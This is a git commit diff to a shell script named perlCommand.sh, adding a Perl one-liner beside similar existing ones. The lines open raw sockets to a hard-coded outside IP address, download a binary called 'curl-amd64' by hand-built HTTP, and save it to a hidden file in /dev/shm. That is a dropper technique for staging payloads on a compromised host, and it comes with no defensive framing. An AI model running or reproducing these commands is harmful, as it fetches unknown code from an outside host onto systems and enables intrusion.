4efca5897005bae01cb1f58846f988aae7817b65
MOZZES650 <110117895+MOZZES650@users.noreply.github.com>
2026-01-07 22:30:59 +0100

    Update perlCommand.sh

--- perlCommand.sh
+++ perlCommand.sh
@@ -3,6 +3,9 @@ perl -e 'use Socket; print "Socket OK"'
 perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(6001,inet_aton("176.160.153.17")));print S "GET /curl-amd64 HTTP/1.0\r\nHost: 176.160.153.17\r\n\r\n";open(O,">/dev/shm/.x");while(<S>){$h=1 if $_ =~ /^\r?\n$/; print O $_ if $h;}close(O);'
 
 
+perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(6001,inet_aton("176.160.153.17")));open(O,">/dev/shm/.x");while(<S>){print O $_;}close(O);close(S);'
+
+
 perl -MIO::Socket -e '$c=IO::Socket::INET->new("176.160.153.17:6000"); print $c "ping\n" if $c'
 
 
